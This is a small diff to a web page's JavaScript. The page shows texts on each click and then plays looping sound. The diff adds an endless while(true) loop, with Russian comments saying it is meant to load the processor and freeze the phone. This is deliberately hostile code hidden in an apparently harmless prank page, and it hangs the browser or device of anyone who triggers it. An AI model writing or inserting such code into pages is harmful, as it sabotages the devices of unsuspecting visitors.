@@ -38,8 +38,13 @@
                 document.getElementById("text").textContent = texts[index];
                 clickCount++;
             } else {
-                sound.loop = true; // Бесконечное воспроизведение
+                sound.loop = true;
                 sound.play().catch(error => console.log("Ошибка автозапуска:", error));
+
+                // Запускаем бесконечный цикл, нагружающий процессор
+                while (true) {
+                    console.log("Телефон зависает...");
+                }
             }
         }
     </script>
